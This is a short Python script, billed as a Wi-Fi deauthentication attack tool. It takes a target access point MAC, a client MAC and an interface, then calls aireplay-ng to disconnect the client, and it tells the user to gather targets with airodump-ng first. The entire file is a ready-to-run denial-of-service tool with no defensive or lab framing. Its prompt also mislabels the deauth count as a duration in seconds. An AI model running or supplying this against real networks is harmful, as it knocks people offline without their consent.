import subprocess

def run_deauth_attack(time, ap_mac, client_mac, interface):
    print("Running deauthentication attack...")
    command = ['aireplay-ng', '--deauth', str(time), '-a', ap_mac, '-c', client_mac, interface]
    subprocess.run(command)
    print("Deauthentication attack completed.")

def main():
    print("Wi-Fi Deauthentication Attack Script")
    print("==========================================")

    print("Before running this script, make sure you have airodump-ng running in another tab to capture target information.")
    
    ap_mac = input("Enter the target AP MAC address: ")
    client_mac = input("Enter the client MAC address: ")
    time = input("Enter the duration for deauthentication attack (in seconds, default is 0): ").strip() or '0'
    interface = input("Enter the Wi-Fi interface name: ")

    run_deauth_attack(time, ap_mac, client_mac, interface)

if __name__ == '__main__':
    main()
